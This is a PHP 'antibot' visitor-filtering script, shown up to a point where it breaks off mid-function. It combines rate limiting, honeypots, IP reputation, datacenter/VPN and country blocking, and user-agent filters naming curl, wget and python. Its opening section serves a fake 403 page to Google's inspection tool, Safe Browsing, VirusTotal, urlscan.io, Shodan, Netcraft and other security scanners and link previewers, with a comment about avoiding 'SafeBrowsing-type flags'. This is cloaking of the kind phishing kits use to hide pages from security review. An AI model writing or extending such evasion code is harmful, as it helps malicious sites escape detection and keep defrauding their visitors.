<?php
// === Expert stealth-scanner blocker (adds no UI, no path changes) ===
if (!function_exists('ab_mark_block_no_output')) {
    function ab_mark_block_no_output(string $ip_address, string $reason): void {
        // Duplicate of block_and_mark_visitor's DB updates, but without emitting HTML
        global $pdo;
        try {
            // Update/insert visitors
            $stmt = $pdo->prepare("SELECT id FROM visitors WHERE ip_address = ? ORDER BY created_at DESC LIMIT 1");
            $stmt->execute([$ip_address]);
            $id = $stmt->fetchColumn();
            if ($id) {
                $stmt = $pdo->prepare("UPDATE visitors SET blocked = 1, block_reason = ?, updated_at = NOW() WHERE id = ?");
                $stmt->execute([$reason, $id]);
            } else {
                $stmt = $pdo->prepare("INSERT INTO visitors (ip_address, blocked, block_reason, created_at) VALUES (?, 1, ?, NOW())");
                $stmt->execute([$ip_address, $reason]);
            }
            // Ensure blocked_ips
            $stmt = $pdo->prepare("SELECT COUNT(*) FROM blocked_ips WHERE ip_address = ?");
            $stmt->execute([$ip_address]);
            if ((int)$stmt->fetchColumn() === 0) {
                $stmt = $pdo->prepare("INSERT INTO blocked_ips (ip_address, blocked_at, block_reason) VALUES (?, NOW(), ?)");
                $stmt->execute([$ip_address, $reason]);
            }
        } catch (Throwable $e) {
            // Silent; blocking should still proceed
        }
    }
}

if (!function_exists('ab_send_stealth_block')) {
    // Modified to show custom 403 Forbidden HTML
    function ab_send_stealth_block(int $code = 403): void {
        if (!headers_sent()) {
            header('X-Robots-Tag: noindex, nofollow, noarchive');
            header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
            header('Pragma: no-cache');
            header('Expires: 0');
            header("Content-Security-Policy: default-src 'none'");
            header('X-Content-Type-Options: nosniff');
            http_response_code(403);
            header('Content-Type: text/html; charset=UTF-8');
        }
        echo <<<HTML
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p>
HTML;
        exit;
    }
}

if (!function_exists('ab_should_stealth_block_scanner')) {
    function ab_should_stealth_block_scanner(string $ua, array $server): ?string {
        $ua_lc = strtolower($ua ?? '');

        // --- 1) Known "inspection / preview" UAs (avoid SafeBrowsing-type flags & previews) ---
        $tokens = [
            // Google testing/inspection & other fetchers
            'google-inspectiontool', // official testing crawler
            'google-safety', 'safe-browsing', 'safebrowsing', // defensive catch (not always used as UA)
            // Social/link previewers
            'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot', 'pinterestbot',
            'slackbot-linkexpanding', 'discordbot', 'telegrambot','skypeuripreview',
            // Security scanners / intel
            'virustotal', 'urlscan.io', 'censys', 'censysinspect', 'shodan', 'zoomeye',
            'binaryedge', 'netcraft', 'qualys', 'acunetix', 'nessus', 'netsparker', 'nikto',
            // Generic crawlers
            'crawler', 'spider', 'preview' // safe generic catches
        ];
        foreach ($tokens as $t) {
            if ($t !== '' && strpos($ua_lc, $t) !== false) {
                return 'scanner_ua:' . $t;
            }
        }

        // --- 2) Prefetch/preview headers (Chrome/Safari/FB app) ---
        $h = array_change_key_case($server, CASE_UPPER);
        $purpose = ($h['HTTP_PURPOSE'] ?? '') . ' ' . ($h['HTTP_SEC_PURPOSE'] ?? '') . ' ' . ($h['HTTP_X_PURPOSE'] ?? '');
        if (stripos($purpose, 'prefetch') !== false || stripos($purpose, 'preview') !== false) {
            return 'scanner_hdr:purpose=' . trim($purpose);
        }

        // Range requests for HTML from bots are also suspicious, but avoid FPs by requiring UA match above.
        return null;
    }
}

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

use MaxMind\Db\Reader;

require_once __DIR__ . '/db.php';                 // 💡 safer than include
require_once __DIR__ . '/vendor/autoload.php';
require_once __DIR__ . '/protection_upgrade.php';
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}


function check_browser_fingerprint($ip_address) {
    global $pdo;
    try {
        $stmt = $pdo->prepare("SELECT COUNT(*)
                                 FROM browser_fingerprints bf
                                 JOIN visitors v
                                   ON v.browser_fingerprint = bf.fingerprint_hash
                                WHERE v.ip_address = ?
                                  AND bf.is_suspicious = 1");
        $stmt->execute([$ip_address]);
        if ((int)$stmt->fetchColumn() > 0) {
            return ['blocked' => true, 'reason' => 'Suspicious browser fingerprint detected'];
        } else {
            return ['blocked' => false, 'reason' => ''];
        }
    } catch (Exception $e) {
        error_log('Browser fingerprint check error: ' . $e->getMessage());
        return ['blocked' => false, 'reason' => ''];
    }
}

/**
 * Helper: truthy setting detector (supports multiple key aliases).
 * Accepts: 1, '1', true, 'true', 'on', 'yes'.
 */
// --- TLS fingerprinting stub (global) ---
// Keep this at file scope so calls inside block_if_bot() always see it.
function ensure_visitor_row($pdo, $ip, $country, $ua) {
    $stmt = $pdo->prepare("SELECT id FROM visitors WHERE ip_address = ? ORDER BY created_at DESC LIMIT 1");
    $stmt->execute([$ip]);
    if (!$stmt->fetchColumn()) {
        $stmt = $pdo->prepare("INSERT INTO visitors (ip_address, country, user_agent, is_bot, block_reason, created_at)
                               VALUES (?, ?, ?, 0, 'OK', NOW())");
        $stmt->execute([$ip, $country, $ua]);
    }
}


 
function feature_enabled(array $settings, array $keys): bool {
    foreach ($keys as $k) {
        if (!array_key_exists($k, $settings)) continue;
        $v = strtolower((string)$settings[$k]);
        if ($v === '1' || $v === 'true' || $v === 'on' || $v === 'yes') return true;
    }
    return false;
}

function get_client_ip() {
    $settings = $GLOBALS['settings'] ?? [];
    if (function_exists('ab_get_client_ip_safe')) {
        return ab_get_client_ip_safe(is_array($settings) ? $settings : []);
    }

    // Legacy fallback
    static $trusted = ['127.0.0.1', '::1'];
    $remote = $_SERVER['REMOTE_ADDR'] ?? '';
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($remote, $trusted, true)) {
        return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    }
    return $remote ?: '0.0.0.0';
}


function block_if_bot() {
    global $pdo;

    $is_bot = false;
    $block_reason = 'N/A';

    // Load settings as key=>value and expose globally for helper functions
    // Uses short cache when available; dashboard changes remain responsive.
    $settings = function_exists('ab_load_settings') ? ab_load_settings($pdo) : ($pdo->query("SELECT name, value FROM settings")->fetchAll(PDO::FETCH_KEY_PAIR) ?: []);
    $GLOBALS['settings'] = $settings; // 👈 make visible to functions that do `global $settings`

    // === Feature toggles (accept multiple possible names from the dashboard) ===
    $captcha_enabled                  = feature_enabled($settings, ['captcha_enabled', 'captcha_protection']);
    $math_captcha_enabled             = feature_enabled($settings, ['math_captcha_enabled', 'math_captcha']);
    $user_agent_blocking_enabled      = feature_enabled($settings, ['user_agent_blocking_enabled','user_agent_blocking','blocked_user_agents']);
    $ip_blocking_enabled              = feature_enabled($settings, ['ip_blocking_enabled','ip_range_blocking','ip_range_blocking_enabled']);
    $asn_blocking_enabled             = feature_enabled($settings, ['asn_blocking_enabled','asn_blocking']);
    $static_range_blocking_enabled    = feature_enabled($settings, ['static_range_blocking','static_range_blocking_enabled']);

    // Advanced
    $behavioral_analysis_enabled      = feature_enabled($settings, ['behavioral_analysis_enabled','behavioral_analysis']);
    $browser_fingerprinting_enabled   = feature_enabled($settings, ['browser_fingerprinting_enabled','browser_fingerprinting']);
    $tls_fingerprinting_enabled       = feature_enabled($settings, ['tls_fingerprinting_enabled','tls_fingerprinting']);
    $device_fingerprinting_enabled    = feature_enabled($settings, ['device_fingerprinting_enabled','device_fingerprinting']);
    $session_analysis_enabled         = feature_enabled($settings, ['session_analysis_enabled','session_analysis']);
    $request_pattern_analysis_enabled = feature_enabled($settings, ['request_pattern_analysis_enabled','request_pattern_analysis']);

    $rate_limiting_enabled            = feature_enabled($settings, ['rate_limiting_enabled','rate_limiting']);
    $honeypot_enabled                 = feature_enabled($settings, ['honeypot_enabled','honeypot']);
    $ip_reputation_enabled            = feature_enabled($settings, ['ip_reputation_enabled','ip_reputation']);

    // Professional safe upgrade toggles (server-side only; CAPTCHA untouched)
    $adaptive_risk_engine_enabled     = feature_enabled($settings, ['adaptive_risk_engine_enabled']);
    $temporary_block_ttl_enabled      = feature_enabled($settings, ['temporary_block_ttl_enabled']);
    $route_rate_limits_enabled        = feature_enabled($settings, ['route_rate_limits_enabled']);
    $advanced_cache_enabled           = feature_enabled($settings, ['advanced_cache_enabled']);

    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $ip_address = get_client_ip();
    $visitor_country = get_country_from_ip($ip_address);

		ensure_visitor_row($pdo, $ip_address, $visitor_country, $user_agent);


// --- Bot category / custom User-Agent management (safe server-side layer) ---
if (function_exists('ab_ua_category_decision')) {
    $ua_decision = ab_ua_category_decision($pdo, $user_agent, $settings);
    if (($ua_decision['action'] ?? '') === 'allow') {
        log_visitor($ip_address, $visitor_country, $user_agent, false, $ua_decision['reason'] ?? 'Allowed bot category');
        return;
    }
    if (($ua_decision['action'] ?? '') === 'block') {
        $cat_reason = $ua_decision['reason'] ?? 'Blocked bot category';
        log_visitor($ip_address, $visitor_country, $user_agent, true, $cat_reason);
        block_and_mark_visitor($ip_address, $cat_reason);
        return;
    }
}

// --- Stealth-block scanners / previewers before rendering (no "red page") ---
if (isset($user_agent_blocking_enabled) && $user_agent_blocking_enabled) {
    $scanner_reason = ab_should_stealth_block_scanner($user_agent, $_SERVER);
    if ($scanner_reason) {
        try { log_visitor($ip_address, $visitor_country, $user_agent, true, $scanner_reason); } catch (Throwable $e) {}
        ab_mark_block_no_output($ip_address, $scanner_reason);
        ab_send_stealth_block(404);
        return;
    }
}
		
    // 🔒 Skip blocking if whitelisted
    if (is_ip_whitelisted($ip_address)) {
        // Still log visit for analytics
        log_visitor($ip_address, $visitor_country, $user_agent, false, 'Whitelisted');
        return;
    }

    // === PROFESSIONAL SAFE LAYER ===
    // Runs after whitelist and before heavy checks. It does not alter CAPTCHA flow.
    if (function_exists('ab_apply_professional_layer')) {
        $pro_result = ab_apply_professional_layer($pdo, $ip_address, $visitor_country, $user_agent, $settings);
        if (!empty($pro_result['blocked'])) {
            $pro_reason = $pro_result['reason'] ?? 'Professional protection block';
            log_visitor($ip_address, $visitor_country, $user_agent, true, $pro_reason);
            if (!empty($pro_result['hard'])) {
                block_and_mark_visitor($ip_address, $pro_reason);
            } else {
                // TTL/risk/route blocks stay temporary when the migration is installed.
                ab_send_stealth_block(404);
            }
            return;
        }
    }


/* ---- HONEYPOT (correct placement) ---- */
$honeypot_on = !empty($settings['honeypot_enabled']) || !empty($settings['honeypot']);
if ($honeypot_on) {
    // look for common bait field names, GET or POST
    $hp_keys = ['hp_field','website','url','homepage','contact_email2'];
    foreach ($hp_keys as $k) {
        if (isset($_REQUEST[$k]) && $_REQUEST[$k] !== '') {
            $block_reason = "Honeypot field '$k' filled (bot)";
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }
}


    // Immediate IP block for manual blocking (moved early to ensure enforcement)
   if (is_ip_blocked($ip_address)) {
        $stmt = $pdo->prepare("SELECT block_reason FROM blocked_ips WHERE ip_address = ? LIMIT 1");
        $stmt->execute([$ip_address]);
        $block_reason = $stmt->fetchColumn() ?: 'Manual Block';
        $is_bot = true;
        log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
        block_and_mark_visitor($ip_address, $block_reason);
        return;
    }

    // === PHASE 1: Fast checks ===
    if ($rate_limiting_enabled) {
        $rate_limit_result = check_rate_limiting($ip_address);
        if ($rate_limit_result['blocked']) {
            $is_bot = true;
            $block_reason = $rate_limit_result['reason'];
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }

    if ($honeypot_enabled) {
        $honeypot_result = check_honeypot_interaction($ip_address);
        if ($honeypot_result['blocked']) {
            $is_bot = true;
            $block_reason = $honeypot_result['reason'];
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }

    if ($user_agent_blocking_enabled && is_user_agent_blocked($user_agent)) {
        $is_bot = true;
        $block_reason = 'Blocked User-Agent';
        log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
        block_and_mark_visitor($ip_address, $block_reason);
        return;
    }

    if ($request_pattern_analysis_enabled) {
        $pattern_result = check_blocked_patterns($user_agent, $_SERVER);
        if ($pattern_result['blocked']) {
            $is_bot = true;
            $block_reason = $pattern_result['reason'];
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }

    if (preg_match('/Mobile|Android|iPhone|iPad|iPod/i', $user_agent)) {
        $_SESSION['is_mobile'] = true;
    }

    if ($static_range_blocking_enabled) {
        $static_block_hit = is_ip_in_static_blocklist($ip_address);
        if ($static_block_hit) {
            $is_bot = true;
            $block_reason = "Static IP/range block: $static_block_hit";
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }

    // === PHASE 2: Medium-cost checks ===
    if ($ip_reputation_enabled) {
        $reputation_result = check_ip_reputation($ip_address);
        if ($reputation_result['blocked']) {
            $is_bot = true;
            $block_reason = $reputation_result['reason'];
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }




    $rdns = function_exists('ab_cached_rdns') ? ab_cached_rdns($pdo, $ip_address, $settings) : (@gethostbyaddr($ip_address) ?: '');
    foreach (['amazonaws','google','ovh','linode','digitalocean','m247','netcup','choopa'] as $pattern) {
        if ($rdns !== '' && stripos($rdns, $pattern) !== false) {
            
            log_visitor($ip_address, $visitor_country, $user_agent, true, "Suspicious reverse DNS: $rdns");
            block_and_mark_visitor($ip_address, "Suspicious reverse DNS: $rdns");
            return;
        }
    }

    // Local reputation lists (admin-updated files, no API required)
    $local_reputation_lists = [
        [
            'setting' => 'block_spamhaus_drop_enabled',
            'default' => true,
            'label' => 'Spamhaus DROP',
            'type' => 'cidr',
            'files' => [
                __DIR__ . '/admin/reputation_lists/spamhaus_drop.txt',
                __DIR__ . '/admin/spamhaus_drop.txt', // legacy location
            ],
        ],
        [
            'setting' => 'block_tor_exit_nodes_enabled',
            'default' => false,
            'label' => 'Tor Exit Node',
            'type' => 'ip',
            'files' => [__DIR__ . '/admin/reputation_lists/tor_exit_nodes.txt'],
        ],
    ];

    foreach ($local_reputation_lists as $rep_list) {
        $setting_name = $rep_list['setting'];
        $enabled = isset($settings[$setting_name])
            ? in_array(strtolower((string)$settings[$setting_name]), ['1','true','on','yes'], true)
            : (bool)$rep_list['default'];
        if (!$enabled) continue;

        foreach ($rep_list['files'] as $rep_file) {
            if (!is_file($rep_file) || !is_readable($rep_file)) continue;
            $lines = file($rep_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (!$lines) continue;

            foreach ($lines as $line) {
                $entry = trim(preg_split('/[#;]/', (string)$line, 2)[0]);
                if ($entry === '') continue;

                $matched = false;
                if ($rep_list['type'] === 'cidr') {
                    $matched = (strpos($entry, '/') !== false) && ip_in_range($ip_address, $entry);
                } else {
                    $matched = filter_var($entry, FILTER_VALIDATE_IP) && strcasecmp($ip_address, $entry) === 0;
                }

                if ($matched) {
                    $is_bot = true;
                    $block_reason = $rep_list['label'] . " block: $ip_address matched $entry";
                    log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
                    block_and_mark_visitor($ip_address, $block_reason);
                    return;
                }
            }
        }
    }

    // ASN blocking (requires mmdb)
    if ($asn_blocking_enabled && is_file(__DIR__ . '/admin/GeoLite2-ASN.mmdb')) {
        try {
            $reader = new Reader(__DIR__ . '/admin/GeoLite2-ASN.mmdb');
            $asn_data = $reader->get($ip_address);
            $autonomousSystemOrg = $asn_data['autonomous_system_organization'] ?? '';

            $vpn_keywords = [
                'digitalocean','ovh','aws','amazon','choopa','linode','google','m247','netcup',
                'leaseweb','vultr','contabo','hetzner','scaleway','oracle','tencent','azure',
                'microsoft','rackspace','hivelocity','nocix','ipxo','datacamp','ionos','kamatera',
                'interserver','gcore','cloudsigma','upcloud','layerhost','virtua','servermania',
                'hostwinds','colo','krypt','serverhub','hosthatch','alpha vps','packet','megaport',
                'resonant','zenlayer','nordvpn','expressvpn','surfshark','cyberghost','windscribe',
                'purevpn','torguard','private internet access','pia','hide.me','mullvad','protonvpn',
                'vpn unlimited','vpnsecure','vpn.ac','strongvpn','ivpn','fastestvpn','vpnbook',
                'hotspot shield','blazingseo','mydataknox','cloudlayer8','reliablesite','wowrack',
                'shinjiru','hostkey','quasi networks','serverius','zare','frantech','gigsgigscloud',
                'skyhost','redstation','inmotion','liquidweb','ovhcloud','china telecom','china unicom'
            ];

            foreach ($vpn_keywords as $keyword) {
                if ($autonomousSystemOrg !== '' && stripos($autonomousSystemOrg, $keyword) !== false) {
                    $is_bot = true;
                    $block_reason = "ASN VPN/RDP blocked: $autonomousSystemOrg";
                    log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
                    block_and_mark_visitor($ip_address, $block_reason);
                    return;
                }
            }
        } catch (\Throwable $e) {
            // ignore
        }
    }

    // === PHASE 3: Expensive checks ===
    if ($browser_fingerprinting_enabled) {
        $fingerprint_result = check_browser_fingerprint($ip_address);
        if ($fingerprint_result['blocked']) {
            $is_bot = true;
            $block_reason = $fingerprint_result['reason'];
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }
	
	/* ==== DEVICE FINGERPRINT ==== */
if ($device_fingerprinting_enabled) {
    $dev = check_device_fingerprint($ip_address);
    if ($dev['blocked']) {
        log_visitor($ip_address, $visitor_country, $user_agent, true, $dev['reason']);
        block_and_mark_visitor($ip_address, $dev['reason']);
        return;
    }
}

/* ==== TLS FINGERPRINT ==== */
if ($tls_fingerprinting_enabled) {
    $tls = check_tls_fingerprint($ip_address);
    if ($tls['blocked']) {
        log_visitor($ip_address, $visitor_country, $user_agent, true, $tls['reason']);
        block_and_mark_visitor($ip_address, $tls['reason']);
        return;
    }
}






    if ($behavioral_analysis_enabled) {
        $behavioral_result = check_behavioral_patterns($ip_address, session_id());
        if ($behavioral_result['blocked']) {
            $is_bot = true;
            $block_reason = $behavioral_result['reason'];
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }

    if ($session_analysis_enabled) {
        $session_result = check_session_analysis($ip_address, session_id());
        if ($session_result['blocked']) {
            $is_bot = true;
            $block_reason = $session_result['reason'];
            log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
            block_and_mark_visitor($ip_address, $block_reason);
            return;
        }
    }

    // Deep header inspection
    $required_headers = [
        'User-Agent'       => $_SERVER['HTTP_USER_AGENT']        ?? '',
        'Accept'           => $_SERVER['HTTP_ACCEPT']            ?? '',
        'Accept-Language'  => $_SERVER['HTTP_ACCEPT_LANGUAGE']   ?? '',
    ];

    foreach ($required_headers as $header_name => $value) {
        if ($value === '') {
            $is_bot = true;
            $block_reason = "Missing or empty HTTP header: $header_name";
            break;
        }
        $lower_value = strtolower($value);
        if (strpos($lower_value, 'python') !== false ||
            strpos($lower_value, 'curl')   !== false ||
            strpos($lower_value, 'wget')   !== false) {
            $is_bot = true;
            $block_reason = "Suspicious header content in: $header_name";
            break;
        }
    }

    if ($is_bot) {
        log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
        block_and_mark_visitor($ip_address, $block_reason);
        return;
    }

    // Simple UA bot patterns (fast)
    foreach (['curl','wget','python','httpclient','scrapy','perl','axios','go-http-client','libwww','java'] as $pattern) {
        if (stripos($user_agent, $pattern) !== false) {
            block_and_mark_visitor($ip_address, "Bot pattern detected in User-Agent: $pattern");
            return;
        }
    }

    // Country allowlist (DB-backed; if table empty = allow all)
    $allowed_countries = [];
    try {
        $stmt = $pdo->query("SELECT country_code FROM allowed_countries");
        $allowed_countries = $stmt->fetchAll(PDO::FETCH_COLUMN) ?: [];
    } catch (\Throwable $e) {
        @file_put_contents(__DIR__ . '/logs/country_db_error.log', date('Y-m-d H:i:s') . ' - ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
    }
    if (!empty($allowed_countries) && !in_array($visitor_country, $allowed_countries, true)) {
        $is_bot = true;
        $block_reason = 'Access is not allowed from your location.';
        log_visitor($ip_address, $visitor_country, $user_agent, true, $block_reason);
        block_and_mark_visitor($ip_address, $block_reason);
        return;
    }

    // Final log for allowed visitor
    log_visitor($ip_address, $visitor_country, $user_agent, false, 'OK');

    // Challenge/Captcha only on index.php
    if (!$is_bot && ($captcha_enabled || $math_captcha_enabled) &&
        empty($_SESSION['captcha_passed']) &&
        basename($_SERVER['SCRIPT_FILENAME']) === 'index.php') {
        handle_captcha($ip_address);
    }
}

function check_rate_limiting($ip_address) {
    global $pdo, $settings;
    $requests_per_minute = (int)($settings['rate_limit_requests_per_minute'] ?? 60);
    $requests_per_hour   = (int)($settings['rate_limit_requests_per_hour']   ?? 1000);

    try {
        // Check if blocked from any rate limit window
        $stmt = $pdo->prepare("SELECT blocked_until FROM rate_limits WHERE ip_address = ? AND blocked_until > NOW() LIMIT 1");
        $stmt->execute([$ip_address]);
        if ($stmt->fetchColumn()) {
            return ['blocked' => true, 'reason' => 'Rate limit exceeded - temporarily blocked'];
        }

        // Minute window
        $stmt = $pdo->prepare("INSERT INTO rate_limits (ip_address, endpoint, request_count, window_start)
            VALUES (?, 'per_minute', 1, NOW())
            ON DUPLICATE KEY UPDATE
                request_count = CASE WHEN window_start < DATE_SUB(NOW(), INTERVAL 1 MINUTE) THEN 1 ELSE request_count + 1 END,
                window_start  = CASE WHEN window_start < DATE_SUB(NOW(), INTERVAL 1 MINUTE) THEN NOW() ELSE window_start END");
        $stmt->execute([$ip_address]);

        $stmt = $pdo->prepare("SELECT request_count FROM rate_limits WHERE ip_address = ? AND endpoint = 'per_minute'");
        $stmt->execute([$ip_address]);
        $minute_count = (int)$stmt->fetchColumn();

        if ($minute_count > $requests_per_minute) {
            $stmt = $pdo->prepare("UPDATE rate_limits SET blocked_until = DATE_ADD(NOW(), INTERVAL 5 MINUTE) WHERE ip_address = ? AND endpoint = 'per_minute'");
            $stmt->execute([$ip_address]);
            return ['blocked' => true, 'reason' => "Minute rate limit exceeded: $minute_count / $requests_per_minute"];
        }

        // Hour window
        $stmt = $pdo->prepare("INSERT INTO rate_limits (ip_address, endpoint, request_count, window_start)
            VALUES (?, 'per_hour', 1, NOW())
            ON DUPLICATE KEY UPDATE
                request_count = CASE WHEN window_start < DATE_SUB(NOW(), INTERVAL 1 HOUR) THEN 1 ELSE request_count + 1 END,
                window_start  = CASE WHEN window_start < DATE_SUB(NOW(), INTERVAL 1 HOUR) THEN NOW() ELSE window_start END");
        $stmt->execute([$ip_address]);

        $stmt = $pdo->prepare("SELECT request_count FROM rate_limits WHERE ip_address = ? AND endpoint = 'per_hour'");
        $stmt->execute([$ip_address]);
        $hour_count = (int)$stmt->fetchColumn();

        if ($hour_count > $requests_per_hour) {
            $stmt = $pdo->prepare("UPDATE rate_limits SET blocked_until = DATE_ADD(NOW(), INTERVAL 30 MINUTE) WHERE ip_address = ? AND endpoint = 'per_hour'");
            $stmt->execute([$ip_address]);
            return ['blocked' => true, 'reason' => "Hour rate limit exceeded: $hour_count / $requests_per_hour"];
        }

        return ['blocked' => false, 'reason' => ''];
    } catch (Exception $e) {
        error_log("Rate limiting error: " . $e->getMessage());
        return ['blocked' => false, 'reason' => ''];
    }
}

function check_honeypot_interaction($ip_address) {
    global $pdo, $settings;
    $trap_count = (int)($settings['honeypot_trap_count'] ?? 1);
    try {
        $stmt = $pdo->prepare("SELECT COUNT(*) FROM honeypot_interactions WHERE ip_address = ? AND interaction_time > DATE_SUB(NOW(), INTERVAL 1 HOUR)");
        $stmt->execute([$ip_address]);
        $interaction_count = (int)$stmt->fetchColumn();
        if ($interaction_count >= $trap_count) {
            return ['blocked' => true, 'reason' => "Honeypot interaction detected ($interaction_count times, threshold $trap_count)"];
        }
        return ['blocked' => false, 'reason' => ''];
    } catch (Exception $e) {
        error_log("Honeypot check error: " . $e->getMessage());
        return ['blocked' => false, 'reason' => ''];
    }
}

function check_blocked_patterns($user_agent, $headers) {
    global $pdo;

    // Build request snapshot once
    $method  = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');
    $uri     = $_SERVER['REQUEST_URI'] ?? '/';
    $path    = parse_url($uri, PHP_URL_PATH) ?? '/';
    $qs      = parse_url($uri, PHP_URL_QUERY) ?? '';
    $rawLine = trim(($headers['REQUEST_METHOD'] ?? $method) . ' ' . ($headers['REQUEST_URI'] ?? $uri));
    parse_str($qs, $params); // array of query params

    try {
        $stmt = $pdo->query("
            SELECT pattern_type, pattern_value, pattern_regex, description, severity
            FROM blocked_patterns
            WHERE is_active = 1
        ");
        $patterns = $stmt->fetchAll(PDO::FETCH_ASSOC);

        foreach ($patterns as $p) {
            $type = strtolower($p['pattern_type'] ?? '');
            $val  = (string)($p['pattern_value'] ?? '');
            $rx   = (string)($p['pattern_regex'] ?? '');
            $desc = (string)($p['description'] ?? 'Request pattern violation');
            $sev  = strtolower($p['severity'] ?? 'high'); // low/medium/high

            // Helper: safe preg
            $preg = function(string $regex, string $subject): bool {
                if ($regex === '') return false;
                set_error_handler(function(){});
                $ok = @preg_match($regex, $subject) === 1;
                restore_error_handler();
                return $ok;
            };

            switch ($type) {
                case 'user_agent':
                    if ($val !== '' && stripos($user_agent, $val) !== false) {
                        return ['blocked' => true, 'reason' => "Blocked pattern in User-Agent: $desc"];
                    }
                    if ($rx !== '' && $preg($rx, $user_agent)) {
                        return ['blocked' => true, 'reason' => "Blocked UA (regex): $desc"];
                    }
                    break;

                case 'header_missing': {
                    $key = 'HTTP_' . strtoupper(str_replace('-', '_', $val));
                    if (empty($headers[$key] ?? '')) {
                        return ['blocked' => true, 'reason' => "Missing required header: $desc"];
                    }
                    break;
                }

                case 'url_regex':      // regex on full URL (path?query)
                    if ($rx !== '' && $preg($rx, $uri)) {
                        return ['blocked' => true, 'reason' => "URL rule: $desc"];
                    }
                    break;

                case 'path_regex':     // regex on path only
                    if ($rx !== '' && $preg($rx, $path)) {
                        return ['blocked' => true, 'reason' => "Path rule: $desc"];
                    }
                    break;

                case 'query_regex':    // regex on raw querystring
                    if ($rx !== '' && $preg($rx, $qs)) {
                        return ['blocked' => true, 'reason' => "Query rule: $desc"];
                    }
                    break;

                case 'param_regex': {  // pattern_value = param name, pattern_regex = regex on its value
                    $param = $val;
                    if ($param !== '' && array_key_exists($param, $params)) {
                        $pv = is_array($params[$param]) ? implode(',', $params[$param]) : (string)$params[$param];
                        if ($rx !== '' && $preg($rx, $pv)) {
                            return ['blocked' => true, 'reason' => "Param '$param' rule: $desc"];
                        }
                    }
                    break;
                }

                case 'method_deny':    // pattern_value = e.g. POST or "PUT,DELETE"
                    $deny = array_filter(array_map('trim', explode(',', strtoupper($val))));
                    if ($deny && in_array($method, $deny, true)) {
                        return ['blocked' => true, 'reason' => "HTTP method not allowed here: $method ($desc)"];
                    }
                    break;

                case 'method_allow':   // allowlist; anything else is blocked
                    $allow = array_filter(array_map('trim', explode(',', strtoupper($val))));
                    if ($allow && !in_array($method, $allow, true)) {
                        return ['blocked' => true, 'reason' => "HTTP method not allowed: $method ($desc)"];
                    }
                    break;

                case 'raw_request_regex': // regex on "METHOD /path?query"
                    if ($rx !== '' && $preg($rx, $rawLine)) {
                        return ['blocked' => true, 'reason' => "Raw request rule: $desc"];
                    }
                    break;

                case 'behavioral':
                    // reserved (you can tie this to your behavioral tables later)
                    break;
            }
        }

        return ['blocked' => false, 'reason' => ''];
    } catch (Throwable $e) {
        error_log("Pattern check error: " . $e->getMessage());
        return ['blocked' => false, 'reason' => ''];
    }
}


function check_ip_reputation($ip_address) {
    global $pdo, $settings;
    $threshold = (int)($settings['ip_reputation_threshold'] ?? 50);
    try {
        $stmt = $pdo->prepare("SELECT reputation_score, threat_types, is_proxy, is_vpn, is_tor, is_datacenter
                               FROM ip_reputation WHERE ip_address = ? AND cache_expires > NOW()");
        $stmt->execute([$ip_address]);
        $cached = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($cached) {
            if ($cached['reputation_score'] < $threshold ||
                $cached['is_proxy'] || $cached['is_vpn'] || $cached['is_tor'] || $cached['is_datacenter']) {
                $reasons = [];
                if ($cached['reputation_score'] < $threshold) $reasons[] = "Low reputation score: {$cached['reputation_score']}";
                if ($cached['is_proxy'])       $reasons[] = "Proxy detected";
                if ($cached['is_vpn'])         $reasons[] = "VPN detected";
                if ($cached['is_tor'])         $reasons[] = "Tor exit node";
                if ($cached['is_datacenter'])  $reasons[] = "Datacenter IP";
                return ['blocked' => true, 'reason' => "IP reputation check failed: " . implode(', ', $reasons)];
            }
        } else {
            $reputation_score = 50; $is_datacenter = 0; $is_proxy = 0; $is_vpn = 0; $is_tor = 0;
            $rdns = @gethostbyaddr($ip_address) ?: '';
            foreach (['amazonaws','googlecloud','azure','digitalocean','linode','vultr'] as $pattern) {
                if ($rdns !== '' && stripos($rdns, $pattern) !== false) {
                    $is_datacenter = 1;
                    $reputation_score = 30;
                    break;
                }
            }
            $stmt = $pdo->prepare("INSERT INTO ip_reputation
                (ip_address, reputation_score, is_proxy, is_vpn, is_tor, is_datacenter, cache_expires)
                VALUES (?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))
                ON DUPLICATE KEY UPDATE
                    reputation_score = VALUES(reputation_score),
